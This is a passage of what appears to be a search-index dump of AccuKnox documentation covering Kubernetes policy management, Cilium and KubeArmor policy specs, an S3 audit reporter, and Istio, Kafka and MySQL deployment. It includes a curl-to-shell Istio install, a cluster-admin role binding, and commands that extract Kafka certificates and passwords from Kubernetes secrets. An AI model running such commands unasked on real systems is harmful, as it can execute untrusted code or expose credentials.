</ul>"},{"location":"policy_audit_logs/overview/","title":"Overview","text":""},{"location":"policy_audit_logs/overview/#overview","title":"Overview","text":"<p>Policy Audit Logs is a Version Control System used to save different versions of a policy so that any version is reviewable at will.</p> <p>click <code>Policy Audit Logs</code> from left navigation</p> <p>Policy Audit logs also make it simple to keep track of and compare policy versions. This means that you may check the details of what changed, who changed what, and the status of the modification at any moment.</p> <p></p> <p>Note: All the actions that can be performed or the visibility in the policy audit logs is based on the role of the user. If you delete any policy, then audit logs will also get removed.</p> <p>Versions will change only after each approval. It will have different versions of the same policy like v1, v2, and so on. </p>"},{"location":"policy_audit_logs/policy_audit_log/","title":"Policy audit log","text":""},{"location":"policy_audit_logs/policy_audit_log/#overview","title":"Overview","text":"<p>Policy Audit Logs is a Version Control System used to save different versions of a policy so that any version is reviewable at will.</p> <p>click <code>Policy Audit Logs</code> from left navigation</p> <p>Policy Audit logs also make it easy to record and compare different policy versions. This means that the details about what changed, who changed what, or the status of the change are reviewable anytime.</p> <p></p>"},{"location":"policy_audit_logs/policy_audit_log/#policy-states","title":"Policy States","text":"<p>There are three primary states in which a policy can be: <code>active</code>, <code>inactive,</code> or <code>approve/deny</code>. It is displayed at the right corner of each policy.</p> <p><code>Active:</code> Approved policy will be in an active state. The latest change is highlighted in green.</p> <p><code>Inactive:</code> If the policy is set to the <code>inactive</code> state from the <code>Policy Manager</code>, then the same will be shown here too.</p> <p><code>approve/deny</code>: If you add any changes to the policy, then the policy will be shifted to <code>Pending</code> state and you can either <code>approve/deny</code> changes. Changes will be highlighted in green.</p>"},{"location":"policy_audit_logs/policy_audit_log/#status-of-the-changes","title":"Status of the changes","text":"<p>Select any of the rows to see detailed information about the specific policy.</p> <p>There are two states in which a change can be <code>Approved</code> or <code>Denied</code></p> <p><code>Approved</code>: The changes which have been approved to the policy. Changes can be add, change or delete a rule, changing status of the policy, etc.</p> <p></p> <p><code>Denied</code> : The changes which have been denied to the policy. Changes can be add, change or delete a rule, changing status of the policy, etc.</p> <p></p> <p>Note: All the actions that can be performed or the visibility in the policy audit logs is based on the role of the user. If you delete any policy, then audit logs will also get removed.</p> <p>Versions will change only after each approval. </p>"},{"location":"policy_audit_logs/policy_status/","title":"Policy Status","text":""},{"location":"policy_audit_logs/policy_status/#policy-status","title":"Policy Status","text":"<p>There are three primary states in which a policy can be: <code>active</code>, <code>inactive,</code> or <code>approve/deny</code>. It is displayed at the right corner of each policy.</p> <p><code>Active:</code> Approved policy will be in an active state. The latest change is highlighted in green.</p> <p><code>Inactive:</code> If the policy is set to the <code>inactive</code> state from the <code>Policy Manager</code>, then the same will be shown here too.</p> <p><code>Approve/Deny</code>: If you add any changes to the policy, then the policy will be shifted to <code>Pending</code> state and you can either <code>approve/deny</code> changes. Changes will be highlighted in green.</p>"},{"location":"policy_audit_logs/status_of_changes/","title":"Status of changes","text":""},{"location":"policy_audit_logs/status_of_changes/#status-of-the-changes","title":"Status of the changes","text":"<p>Right click on policy name from the default screen to see details of versions and changes </p> <p>There are two states in which a change can be <code>Approved</code> or <code>Denied</code></p> <p><code>Approved</code>: The changes which have been approved to the policy. Changes can be add, change or delete a rule, changing status of the policy, etc.</p> <p></p> <p><code>Denied</code> : The changes which have been denied to the policy. Changes can be add, change or delete a rule, changing status of the policy, etc.</p> <p></p>"},{"location":"policy_manager/approve_policies/","title":"How to approve policies","text":""},{"location":"policy_manager/approve_policies/#approve-policy","title":"Approve Policy","text":"<p>After you add the rules to policy, Policy will be shifted to the <code>Pending</code> state. To make it active, you need to approve the policy.</p> <ol> <li> <p>Select <code>Policy Manager</code> -&gt; <code>Pending Approval</code></p> <p></p> </li> <li> <p>On the Pending Approval list page, <code>Approve</code> your specific policy.</p> <p></p> </li> <li> <p>Go to <code>Policy Manager</code> -&gt; <code>All Policies</code> list page, You can see recently approved policy with status <code>active</code>.</p> <p></p> </li> </ol>"},{"location":"policy_manager/create_and_apply_policies/","title":"Create and apply Policies","text":""},{"location":"policy_manager/create_and_apply_policies/#create-policy-manually","title":"Create Policy Manually:","text":"<p>From two screens you can create/Add Policies.</p>"},{"location":"policy_manager/create_and_apply_policies/#add-policy-from-cluster-manager-dashboard","title":"Add Policy from Cluster Manager Dashboard.","text":"<ol> <li> <p>Log in to Accuknox select <code>Cluster Manager Dashboard</code> from the left navigation bar.</p> </li> <li> <p>Right Click on any entity such as node and pod.</p> </li> <li> <p>Select <code>Add Policy</code></p> </li> </ol>"},{"location":"policy_manager/create_and_apply_policies/#create-policy-from-policy-manager","title":"Create Policy from Policy Manager","text":"<ol> <li> <p>Log in to Accuknox and select <code>Policy Manager</code> -&gt; <code>All Policies</code></p> </li> <li> <p>On the All Policies page, select <code>Create Policy</code></p> </li> </ol>"},{"location":"policy_manager/create_and_apply_policies/#define-basic-policy-parameters","title":"Define basic policy parameters","text":"<p>Define the basic parameters of the policy before adding the rules.</p> <p></p> <ul> <li> <p>Policy Name</p> <ul> <li>Name of the Policy</li> </ul> </li> <li> <p>Description</p> <ul> <li>Description for the Policy</li> </ul> </li> <li> <p>Policy Type</p> <ul> <li> <p>Policy Type can be Network-Ingress, Network-Egress, and System. Ingress-Policy will apply to all network packets which are entering the endpoint. Egress-Policy will apply to all network packets which are leaving the endpoint. System Policy will restrict behavior at the system level.</p> </li> <li> <p>To set up the network security select policy type to be Network-ingress or Network-egress.</p> </li> </ul> </li> <li> <p>Namespace</p> <ul> <li>Namespace will tell in which namespace that policy is going to apply.</li> </ul> </li> <li> <p>Default/Node</p> <ul> <li>This is used to differentiate between Endpoint Selector(default) and Node Selector(Node). It is called Endpoint Selector because it only applies to labels associated with an Endpoint. Node Selector applies to labels associated with a node in the cluster.</li> </ul> </li> <li> <p>Labels</p> <ul> <li>Labels are used to select specified endpoints (in most cases it will be pods) and nodes.</li> </ul> </li> </ul>"},{"location":"policy_manager/create_and_apply_policies/#createadd-network-policy","title":"Create/Add Network Policy","text":"<p>To set up the network security policies select policy type to be Network-ingress or Network-egress when you define policy type.</p> <p>select <code>Create/Add Policy</code> -&gt; <code>Policy type</code> -&gt; <code>Network-ingress/Network-egress</code></p>"},{"location":"policy_manager/create_and_apply_policies/#createadd-kubearmorsystem-policy","title":"Create/Add Kubearmor(System) Policy","text":"<p>To set up the application security policies select the policy type to be System when you define policy type.</p> <p>select <code>Create/Add Policy</code> \u2192 <code>Policy type</code> -&gt; <code>System</code></p>"},{"location":"policy_manager/create_and_apply_policies/#add-rules","title":"Add Rules","text":"<p>Once the Policy has been created, You will be directed to the Add rules screen.</p> <p>Another way is to select Policy Manager \u2192 All Policies. Selecting a policy from All Policies list page will expand the policy details and access <code>+</code> icon to add rules.</p> <p>The Add rule interface provides an easy way to add rules to or remove rules from a Policy; Rules will differ based on the policy type you chose.</p> <p>See also: Policies and Rules</p>"},{"location":"policy_manager/edit_and_delete_policies/","title":"Edit and Delete policies","text":"<p>Edit Policy</p> <ol> <li> <p>Select <code>Policy Manager</code> -&gt; <code>All Policies</code></p> <p></p> </li> <li> <p>Click on the name of the policy that you want to edit.</p> </li> <li> <p>On the policy detail screen, you have a lot of options to edit.</p> <p></p> </li> <li> <p>You can change the details of the policy by clicking on the above pencil edit icon.</p> </li> <li> <p>You can edit &amp; delete the existing rules by accessing the three dots icon appearing on the right end of specific rules.</p> </li> </ol> <p>See also: Policies and Rules</p> <p>Delete Policy</p> <ol> <li> <p>Select <code>Policy Manager</code> -&gt; <code>All Policies</code></p> <p></p> </li> <li> <p>Click the three-dot icon on the right end of a specific row.</p> </li> <li> <p>Click <code>Delete Policy</code>.</p> <p></p> </li> <li> <p>Click on <code>Confirm</code> button to delete.</p> <p></p> </li> </ol>"},{"location":"policy_manager/network_and%20_system_policies/","title":"What are Network and System Policies","text":"<p>Accuknox enforces application policies and hardening using KubeArmor - our own open-source product that brings AppArmor and SELinux to K8s / Cloud workloads. Additionally, Accuknox builds on top of Cilium to provide full support for identity-based network segmentation for K8s and VM workloads.</p> <p>Network Policy: Network Policies control traffic going in and out of the pods. Cilium implements the Kubernetes Network Policies for L3/L4 level and extends with L7 policies. Cilium policies follow the whitelist model. When a policy is enabled for a pod, all ingress and egress traffic are denied by default unless the policy specification allows specific traffic.</p> <ul> <li> <p>Network-Ingress: List of rules which must apply at the ingress of the endpoint, i.e. to all network packets which are entering the endpoint.</p> </li> <li> <p>Network-Egress: List of rules which must apply at the egress of the endpoint, i.e. to all network packets which are leaving the endpoint.</p> </li> </ul>"},{"location":"policy_manager/network_and%20_system_policies/#structure-of-network-policy","title":"Structure of network policy","text":"<p>Network-egress Policy Specification:</p> <pre><code>apiVersion: \"cilium.io/v2\"\nkind: CiliumNetworkPolicy\nmetadata:\n  name: [policy name]\n  description: [Policy Desciption]\nspec:\n  endpointSelector:          \n    matchLabels:\n      [key1]: [value1]\n      [keyN]: [valueN]\negress:\n  - toEndpoints:\n    - matchLabels:\n        [key1]: [value1]\n        [keyN]: [valueN]\n  - toPorts:\n    - ports:\n      - port: [port number]\n        protocol: [protocol]\n  - toCIDRSet:\n    - cidr: [ip addr]/[cidr bits]\n      except:\n      - [ip addr]/[cidr bits]\n  - toEntities:\n    - [entity]\n  - toServices:\n    - k8sService:\n        serviceName: [service name]\n        namespace: [namespace] \n  - toFQDNs:\n      - matchName: [domain name]\n      - matchPattern: [domain name pattern]\n</code></pre> <p>Network-ingress Policy Specification:</p> <pre><code>apiVersion: \"cilium.io/v2\"\nkind: CiliumNetworkPolicy\nmetadata:\n  name: [policy name]\n  description: [Policy Desciption]\nspec:\n  endpointSelector:          \n    matchLabels:\n      [key1]: [value1]\n      [keyN]: [valueN]\ningress:\n  - toPorts:\n    - ports:\n      - port: [port number]\n        protocol: [protocol]\n  - fromEndpoints:\n    - matchLabels:\n        [key1]: [value1]\n        [keyN]: [valueN]\n  - fromEntities:\n    - [entity]\n  - fromCIDRSet:\n    - cidr: [ip addr]/[cidr bits]\n      except:\n      - [ip addr]/[cidr bits]\n</code></pre> <p>System Policy: System policies restrict the behavior (such as process execution, file access, and networking operation) of containers and nodes at the system level.</p>"},{"location":"policy_manager/network_and%20_system_policies/#structure-of-system-policy","title":"Structure of System Policy","text":""},{"location":"policy_manager/network_and%20_system_policies/#policy-specification","title":"Policy Specification","text":"<pre><code>apiVersion: security.kubearmor.com/v1\nkind:KubeArmorPolicy\nmetadata:\n  name: [policy name]\n  namespace: [namespace name]\nspec:                       \n  selector:                               # --&gt; For KubeArmorHostPolicy selector will be nodeSelector\n    matchLabels:\n      [key1]: [value1]\n      [keyN]: [valueN]\n\n  process:\n    severity: [1-10]                       \n    matchPaths:\n    - path: [absolute executable path]\n      ownerOnly: [true|false]              # --&gt; optional\n      fromSource:                          # --&gt; optional\n      - path: [absolute exectuable path]\n    matchDirectories:\n    - dir: [absolute directory path]\n      recursive: [true|false]              # --&gt; optional\n      ownerOnly: [true|false]              # --&gt; optional\n      fromSource:                          # --&gt; optional\n      - path: [absolute exectuable path]\n    action: [Allow|Audit|Block]\n\n  file:\n    severity: [1-10]                       \n    matchPaths:\n    - path: [absolute file path]\n      readOnly: [true|false]               # --&gt; optional\n      ownerOnly: [true|false]              # --&gt; optional\n      fromSource:                          # --&gt; optional\n      - path: [absolute exectuable path]\n    matchDirectories:\n    - dir: [absolute directory path]\n      recursive: [true|false]              # --&gt; optional\n      readOnly: [true|false]               # --&gt; optional\n      ownerOnly: [true|false]              # --&gt; optional\n      fromSource:                          # --&gt; optional\n      - path: [absolute exectuable path]\n    action: [Allow|Audit|Block]\n\n  network:\n    severity: [1-10]                       \n    matchProtocols:\n    - protocol: [TCP|tcp|UDP|udp|ICMP|icmp]\n      fromSource:                          # --&gt; optional\n      - path: [absolute exectuable path]\n    action: [Allow|Audit|Block]\n\n  capabilities:\n    severity: [1-10]                       \n    matchCapabilities:\n    - capability: [capability name]\n      fromSource:                          # --&gt; optional\n      - path: [absolute exectuable path]\n    action: [Allow|Audit|Block]\n</code></pre> <p>See also: Policies and Rules</p>"},{"location":"policy_manager/view_and_apply_auto_discovery_policy/","title":"View and apply Auto-discovered Policies","text":"<p>Auto Discovery is a policy recommendation system that suggests network and system policies based on the collected network and system logs respectively.</p> <p>Currently, Auto-Discovery can discover (i) egress/ingress network policy for Pod-to- Pod, (External)Service, Entity, CIDR, FQDN, HTTP. And In the System perspective, it can discover (ii) process, file, and network-relevant system policy.</p>"},{"location":"policy_manager/view_and_apply_auto_discovery_policy/#view-auto-discovered-policies","title":"View Auto Discovered Policies.","text":"<ul> <li> <p>You can filter Auto Discovered Policies using the following filters:</p> <ul> <li> <p>Cluster:- Filter Policies by clusters belonging to your workspace.</p> </li> <li> <p>Namespace: Filter Policies by namespaces belonging to selected clusters</p> </li> <li> <p>Policy-Type: Filter Policies by Policy types. There are 3 Policy types. (i) Network-Ingress (ii) Network-Egress (iii) System Policy</p> </li> <li> <p>Category: Category will give the status of the policies. There are 2 categories.</p> <ul> <li> <p>Used: When the Policy is applied from the Auto Discovered Policy Screen, It will go to All Policy Screen and Category will be changed to Used. You can list all used policies with the used category.</p> </li> <li> <p>Ignore: You can list all ignored policies using this filter.</p> </li> </ul> </li> </ul> </li> </ul>"},{"location":"policy_manager/view_and_apply_auto_discovery_policy/#apply-auto-discovered-policies","title":"Apply Auto Discovered Policies.","text":"<ul> <li>Select one or more policies from the list</li> </ul> <p>Note: The default screen will show all unused policies.</p> <ul> <li>Click the \u201cAction\u201d button on the top right corner.</li> </ul> <p></p> <p>There are 3 Actions that can be performed. (i) Apply (ii) Ignore (iii) Deselect all</p> <ul> <li>Click Apply. Then Policy will be applied to the cluster. Applied Policy will go to pending approval.</li> </ul> <p></p> <ul> <li>Click on the \u201cGo to the Pending Approval\u201d screen and Approve the policy.</li> </ul> <p></p> <p>Note: You need Administrative permission to approve policies.</p> <ul> <li>Approved Policy will appear on All Policies Screen.</li> </ul>"},{"location":"policy_manager/view_and_apply_recommended_policy/","title":"View and apply Recommended Polices","text":"<p>Accuknox provides a number of out-of-the-box recommended policies based on popular workloads or for the host. These policies are recommended to you only after analyzing your workloads and hosts.</p> <p>These policies will cover known CVEs and attack vectors, compliance frameworks (such as MITRE, PCI-DSS, STIG, etc.) and many more.</p>"},{"location":"policy_manager/view_and_apply_recommended_policy/#viewing-recommended-policy","title":"Viewing Recommended Policy:","text":"<p>Select <code>Policy Manager</code> -&gt; <code>Recommended Policies</code>. This section is used to help to protect your workloads by recommending security policies to your workloads.</p> <p>Available DSL Filters</p> <ul> <li> <p>Cluster</p> </li> <li> <p>Namespace</p> </li> <li> <p>Workload</p> </li> <li> <p>Policy Type</p> </li> <li> <p>Status</p> </li> </ul> <p>Cluster</p> <p>This will show a list of onboard clusters. In SideBar you can see Workspace Manager click that section there will be 4 subsections. Click that 3th subSection onboard cluster (Workspace Manager \u2192 Onboard Cluster ) now you can onboard cluster. Currently, we are supporting only Google Cloud Platform(GCP) right now and in the future, we will support other cloud platforms too.</p> <p>Namespace</p> <p>This will show a list of Namespaces of an onboard cluster. Namespace filter is mainly used for you can apply Recommended Policy to specify the namespace in the cluster and you can clearly see list namespace in the onboard cluster.</p> <p>Workload</p> <p>A workload is an application running on Kubernetes. Here workload type is used to filter the workloads which are onboard. It is in the form of a checklist and it has a list of workload in the system.</p> <p>Policy Type</p> <p>It is in the form of a drop-down box. The 4 options are listed below</p> <ul> <li> <p>Select All: This should select all the policies of the host and network. Select All \u2192 policy can apply the policy you can either via workload or Pod.</p> </li> <li> <p>Network-Ingress: The Network Policies are created in cilium CNI this Network-Ingress will show how you can control the outgoing connection to incoming connection to the pod or workload.</p> </li> <li> <p>Network-Egress: The network policies are created in cilium CNI this network-Egress will show how you can control the incoming to outgoing connections.</p> </li> <li> <p>System-Policy: The System-policy is created in Kubearmor and it will help to audit the process, file, network.</p> </li> </ul> <p>Status:</p> <p>This is in the form of a checklist. It has three checklists: Select All, Recommended, Ignored, Applied.</p> <ul> <li> <p>Select ALL: this will show both the Recommended Policy and Ignored Policy</p> </li> <li> <p>Recommended Policy: This will show only recommended Policy related to your Workload.</p> </li> <li> <p>Ignored Policy: This will show only which you ignored related to your workload.</p> </li> <li> <p>Applied Policy: This will show only applied policy related to your workload.</p> </li> </ul> <p>Above DSL filter can be used as Permutation and combinations. All the DSL filters can apply at the same time to find out whether Pod or Workload recommended policies are applied or not.</p> <p>Below the DSL button filter, you can see filters by properties. Here also you can use permutation and combination methods to find the specified Pod or workload.</p> <p>Properties:</p> <ul> <li> <p>Policy Group</p> </li> <li> <p>Policy</p> </li> <li> <p>Entity</p> </li> <li> <p>Cluster</p> </li> </ul> <p>The above properties are in the form key-value pair. Here the key is Policy group, policy, Entity, Cluster and values which you are onboard cluster.</p>"},{"location":"policy_manager/view_and_apply_recommended_policy/#applying-recommended-policy","title":"Applying Recommended Policy:","text":"<ol> <li> <p>On the Recommended Policies list page, You can see all the recommended policies based on your workloads and hosts.</p> </li> <li> <p>Select one or more policies, then click <code>Apply</code></p> </li> <li> <p>On the <code>Apply</code> page, selector labels will be preselected associated with your workloads. You can review labels and if you want to change the labels you can also do it. Selector labels will decide where selected policies are going to apply.</p> </li> <li> <p>After Apply; Select <code>Policy Manager</code> -&gt; <code>Pending Approval</code> -&gt; <code>Approve</code></p> </li> </ol>"},{"location":"s3-data-protection/Pre-requisites-S3-Audit-Reporter/","title":"Pre requisites S3 Audit Reporter","text":"<p>The following article provides the pre-requisites and instructions to install AccuKnox S3 Audit Reporter agent to monitor access logs of S3 buckets and export relevent metrics to AccuKnox Control Plane.</p>"},{"location":"s3-data-protection/Pre-requisites-S3-Audit-Reporter/#requirements","title":"Requirements","text":"<p>The following software and network requirements must be met.</p>"},{"location":"s3-data-protection/Pre-requisites-S3-Audit-Reporter/#aws-s3-requirements","title":"AWS S3 Requirements","text":"<p>For any AWS S3 bucket that needs to be monitored, we need the following requirements to be met with:</p> <ol> <li> <p>Enable the AWS S3 Access Logs - https://docs.aws.amazon.com/AmazonS3/latest/userguide/enable-server-access-logging.html</p> </li> <li> <p>Create AWS user credentials(access key id and secret access key) for the Data Bucket - the bucket that contains the objects to be monitored. This user credentials must have permission to list the objects in the data bucket.</p> </li> <li> <p>Create AWS user credentials(access key id and secret access key) for the Logs Bucket - the bucket that contains the logs objects. This user credentials must have permissions to list the objects and retreive the objects present in the logs bucket.</p> </li> </ol>"},{"location":"s3-data-protection/Pre-requisites-S3-Audit-Reporter/#software-requirements","title":"Software Requirements","text":"<p>AccuKnox S3 Audit Reporter supports Linux and can be run on most major Linux based OSes such as Ubuntu 18.04+, Debian 8+, CentOS 7+.</p>"},{"location":"s3-data-protection/Pre-requisites-S3-Audit-Reporter/#network-requirements","title":"Network Requirements","text":"<p>AccuKnox S3 Audit Reporter requires port number 443 to be open for egress. This port will be used to fetch S3 Access Log data, Bucket data and to push metrics to AccuKnox Control Plane.</p>"},{"location":"s3-data-protection/Pre-requisites-S3-Audit-Reporter/#aws-s3-bucket-configuration","title":"AWS S3 Bucket configuration","text":"<p>AccuKnox S3 Audit Reporter can monitor more than 1 bucket at a time. </p> <p>The bucket to be monitored is configured through a file located at conf/buckets.yaml The following is an example of a buckets.yaml:</p> <pre><code>apiVersion: v1\ntype: S3AuditReporterBuckets\ndata:\n  workspace: 30921123\n  apiToken: as013n21m3nkjn2m1m97sd\n  buckets:\n    - dataBucketName: bucket-1\n      logsBucketName: bucket-1-logs\n      logPrefix: logs/\n      dataBucketAccessKeyId: AK.....\n      dataBucketSecretAccessKey: 99.....\n      logBucketAccessKeyId: AK...\n      logBucketSecretAccessKey: 99....\n      dataSourceProvider: AWS\n      bucketRegion: us-west-2\n    - dataBucketName: bucket-2\n      logsBucketName: bucket-2-logs\n      logPrefix:\n      dataBucketAccessKeyId: AK.....\n      dataBucketSecretAccessKey: 99.....\n      logBucketAccessKeyId: AK...\n      logBucketSecretAccessKey: 99....\n      dataSourceProvider: AWS\n      bucketRegion: us-west-2\n</code></pre>"},{"location":"s3-data-protection/Pre-requisites-S3-Audit-Reporter/#root-section","title":"Root section","text":"Key description default required apiVersion Version of the S3 Audit Reporter API None yes type S3AuditReporterBuckets S3AuditReporterBuckets yes data Data section None yes ### Data section Key description default required :----- :----- :------ :------ workspace Your workspace None yes apiToken API Token to use with Accuknox Control Plane None yes buckets List of buckets to monitor None yes ### Buckets section Key description default required :----- :----- :------ :------ dataBucketName Name of the bucket that holds the data objects None yes logsBucketName Name of the bucket that holds the log objects None yes logPrefix The path where the log files are stored in the logs bucket. (empty) yes dataBucketAccessKeyid Access key ID for the Data Bucket None yes dataBucketSecretAccessKey Secret Access Key for the Data Bucket None yes logBucketAccessKeyId Access Key ID for the Logs bucket None yes log BucketSecretAccessKey Secret Access Key for the Logs bucket None yes dataSourceProvider Cloud Provider - AWS, GCP, AZURE None yes bucketRegion Region where the bucket is configured at None yes"},{"location":"s3-data-protection/Pre-requisites-S3-Audit-Reporter/#installation","title":"Installation","text":"<p>Unzip AccuKnox S3 Audit Reporter </p> <p><code>unzip aks3r.zip -d aks3r</code></p> <p>Edit the conf/buckets.yaml</p> <p>Configure the buckets to be monitored</p> <p>Add the workspace</p> <p>Add the apiToken</p> <p>The app.yaml and buckets.yaml files must be present inside conf/ folder.</p> <p>Run AccuKnox S3 Audit Reporter</p> <p><code>./asar &gt; /dev/null 2&gt;&amp;1 &amp;</code></p>"},{"location":"s3-data-protection/istio-depolyment/","title":"Istio Deployment","text":""},{"location":"s3-data-protection/istio-depolyment/#what-is-istio","title":"What is Istio?","text":"<p>Istio is an open source service mesh that layers transparently onto existing distributed applications. Istio\u2019s powerful features provide a uniform and more efficient way to secure, connect, and monitor services. Istio is the path to load balancing, service-to-service authentication, and monitoring \u2013 with few or no service code changes. Its powerful control plane brings vital features, including: * Secure service-to-service communication in a cluster with TLS encryption, strong identity based authentication and authorization</p> <ul> <li> <p>Automatic load balancing for HTTP, gRPC, WebSocket, and TCP traffic \uf0b7 Fine-grained control of traffic behavior with rich routing rules, retries, failovers, and fault injection</p> </li> <li> <p>A pluggable policy layer and configuration API supporting access controls, rate limits and quotas</p> </li> <li> <p>Automatic metrics, logs, and traces for all traffic within a cluster, including cluster ingress and egress </p> </li> </ul>"},{"location":"s3-data-protection/istio-depolyment/#installation-steps","title":"Installation Steps","text":"<ol> <li>Go to the Istio release page to download the installation file for your OS, or download and extract the latest release automatically (Linux or macOS): <pre><code>curl -L https://istio.io/downloadIstio | ISTIO_VERSION=1.10.0 TARGET_ARCH=x86_64 sh -\n</code></pre></li> <li>Move to the Istio package directory.</li> </ol> <p>For example, if the package is istio-1.11.3: <code>cd istio-1.10.0</code></p> <ol> <li>Create a namespace istio-system for Istio components: <pre><code>kubectl create namespace istio-system\n</code></pre></li> <li>Install the Istio base chart which contains cluster-wide resources used by the Istio control plane: <pre><code>helm install istio-base manifests/charts/base -n istio-system\n</code></pre></li> <li>Install the Istio discovery chart which deploys the istiod control plane service: <pre><code>helm install istiod manifests/charts/istio-control/istio-discovery \\ -n istio-system\n</code></pre></li> <li>Install the Istio ingress gateway chart which contains the ingress gateway components: <pre><code>helm install istio-ingress manifests/charts/gateways/istio-ingress \\ -n istio-system\n</code></pre></li> </ol>"},{"location":"s3-data-protection/istio-depolyment/#verifying-the-installation","title":"Verifying the installation","text":"<p>Ensure all Kubernetes pods in istio-system namespace are deployed and have a STATUS of Running: <code>kubectl get pods -n istio-system</code></p>"},{"location":"s3-data-protection/istio-depolyment/#installing-the-gateway","title":"Installing the Gateway","text":"<p>Along with creating a service mesh, Istio allows you to manage gateways, which are Envoy proxies running at the edge of the mesh, providing fine-grained control over traffic entering and leaving the mesh.</p>"},{"location":"s3-data-protection/istio-depolyment/#unzip-and-change-directory","title":"Unzip and Change Directory","text":"<p><pre><code>unzip platform-istio-gateway-dev\ncd platform-istio-gateway-dev\n</code></pre> #Cert Manager Install cert-manager. Cert-manager will manage the certificates of gateway domains.</p> <p>#Setup permissions</p> <p>When running on GKE (Google Kubernetes Engine), you might encounter a \u2018permission denied\u2019 error when creating some of the required resources: <pre><code>kubectl create clusterrolebinding cluster-admin-binding \\  --clusterrole=cluster-admin \\ --user=$(gcloud config get-value core/account)  \n</code></pre> #Install Cert-manager</p> <p><code>kubectl apply -f https://github.com/jetstack/cert-manager/releases/download/v1.3.1/cert-manager.yaml</code></p> <p>#platform-istio-gateway</p> <ul> <li>Istio Gateway configurations for DNS</li> <li>This gateway config file defines the base API endpoints of the micro services under DNS</li> <li>This repository also contains necessary files to setup SSL for DNS (Refer issuer.yaml and cert.yaml) using cert-manager</li> </ul>"},{"location":"s3-data-protection/istio-depolyment/#create-gateway","title":"Create Gateway","text":"<p>#Find the Gateway IP <pre><code>INGRESS_HOST=$(kubectl -n istio-system get service istio-ingressgateway -o jsonpath='{.status.loadBalancer.ingress[0].ip)\n</code></pre> This will give you a LoadBalancer IP: <code>echo ${INGRESS_HOST}</code></p> <p>#Create DNS</p> <p>Create a record (for eg) (sample.example.com and keycloak.example.com) using LoadBalancer IP</p>"},{"location":"s3-data-protection/istio-depolyment/#create-a-certificate","title":"#Create a certificate","text":"<p>Issuers, and ClusterIssuers, are Kubernetes resources that represent certificate authorities (CAs) that are able to generate signed certificates by honoring certificate signing requests. <pre><code>kubectl apply -f issuer.yaml \nkubectl get ClusterIssuer -n cert-manager# Should have Status as Ready \n</code></pre> A Certificate is a namespaced resource that references an Issuer or ClusterIssuer that determine what will be honoring the certificate request. <pre><code>kubectl apply -f cert.yaml \nkubectl get Certificate -n istio-system # Should have Status as Ready \n</code></pre></p>"},{"location":"s3-data-protection/istio-depolyment/#create-gateway-with-ssl","title":"#Create gateway with SSL","text":"<pre><code>kubectl apply -f gateway-with-ssl.yaml` [No need to specify namespace]\n</code></pre>"},{"location":"s3-data-protection/istio-depolyment/#apply-virtual-service","title":"#Apply Virtual Service","text":"<p>A VirtualService defines a set of traffic routing rules to apply when a host is addressed. Each routing rule defines matching criteria for traffic of a specific protocol. If the traffic is matched, then it is sent to a named destination service (or subset/version of it) defined in the registry. <pre><code>kubectl apply -f backend-api/virtual-service.yaml # [No need to specify namespace] \nkubectl apply -f keycloak/virtual-service.yaml # [No need to specify namespace]\n</code></pre></p>"},{"location":"s3-data-protection/kafka-operator-deployment/","title":"Kafka Operator Deployment","text":"<p>Note 1. Do not change the namespace name. If changes to the namespace are made, the you will need to change the service name &amp; If the service name is changed, you will to need to change the microservice configmap files. (eg) app.yaml. 2. Please create a node pool on EKS / GKE / AKS (or) on-premises worker nodes with below Taints and Labels: <pre><code>Taints - kafka:true \nLabels - kafka:true \n</code></pre></p>"},{"location":"s3-data-protection/kafka-operator-deployment/#steps","title":"Steps","text":"<ol> <li>Untar the Kafka deployment files <pre><code>untar saas-kafka-s3-data-protection.tar.xz\n</code></pre></li> <li>Create Namespace <pre><code>kubectl create namespace accuknox-dev-kafka\n</code></pre></li> <li>Set Context <pre><code>kubectl config set-context --current --namespace=accuknox-dev-kafka\n</code></pre></li> <li>Install the Helm pkg <pre><code>helm install dev-kafka saas-kafka\n</code></pre></li> <li>Check the Pods deployment <pre><code>kubectl get pods -n accuknox-dev-kafka\n</code></pre></li> <li>Extract the connectivity information <pre><code>## Get bootstrap server endpoint\nkubectl get kafka dev-kafka -o jsonpath='{.status.listeners[?(@.type==\"external\")].bootstrapServers}' -n accuknox-dev-kafka\n\n## Get CA \nkubectl get secret dev-kafka-cluster-ca-cert -o jsonpath='{.data.ca\\.p12}' -n accuknox-dev-kafka | base64 -d &gt; ca.p12 \n\n## Get CA Password \nkubectl get secret dev-kafka-cluster-ca-cert -o jsonpath='{.data.ca\\.password}' -n accuknox-dev-kafka | base64 -d &gt; ca.password \n\n## Get User Cert \nkubectl get secret/node-event-feeder-common -n accuknox-dev-kafka -o jsonpath='{.data.user\\.p12}' | base64 -d &gt; user.p12 \n\n## Get user password \nkubectl get secret/node-event-feeder-common -n accuknox-dev-kafka -o jsonpath='{.data.user\\.password}' | base64 -d &gt; user.password\n\n## Convert user.p12 into base64\ncat user.p12 | base64 &gt; user.p12.base64\n\n## Convert ca.p12 into base64\ncat ca.p12 | base64 &gt; ca.p12.base64 \n\n## Convert ca.password into base64\ncat ca.password | base64 &gt; ca.password.base64 \n\n## Convert user.password into base64 \ncat user.password | base64 &gt; user.password.base64 \n\n## Convert p12 to pem \nopenssl pkcs12 -in ca.p12 -out ca.pem \n\n## Convert ca.pem to base64 \ncat ca.pem | base64 &gt; ca.pem.base64 \n</code></pre></li> </ol>"},{"location":"s3-data-protection/kafka-operator-deployment/#note","title":"Note","text":"<ol> <li>ca.p12, ca.password, user.p12 and user.password are required to be used in Java based applications.</li> <li>For Go based applications, use ca.pem, user.p12 and user.password.</li> <li>In Kubernetes, use the base64 versions of respective files.</li> </ol>"},{"location":"s3-data-protection/kafka-operator-deployment/#set-fqdn-kubernetess-service-name-value-for-internal-cluster-application","title":"Set FQDN (Kubernetes\u2019s Service name) Value for Internal Cluster application","text":"<p>connectivity <pre><code>FQDN : dev-kafka-kafka-bootstrap.accuknox-dev-kafka.svc.cluster.local:9092\n</code></pre></p>"},{"location":"s3-data-protection/mysql-operator-deployment/","title":"MySQL Operator Deployment","text":"<p>Note 1. Do not change the namespace name. If changes to the namespace are made, the you will need to change the service name &amp; If the service name is changed, you will to need to change the microservice configmap files. (eg) app.yaml. 2. Please create a node pool on EKS / GKE / AKS (or) on-premises worker nodes with below Taints and Labels : <pre><code>Taints - mysql:true \nLabels - mysql:true \n</code></pre></p>"},{"location":"s3-data-protection/mysql-operator-deployment/#steps","title":"Steps","text":"<ol> <li>Untar MySql deployment files <pre><code>untar accuknox-dev-mysql.tar.xz\n</code></pre></li> <li>Create Namespace <pre><code>kubectl create namespace accuknox-dev-mysql\n</code></pre></li> <li>Set Context <pre><code>kubectl config 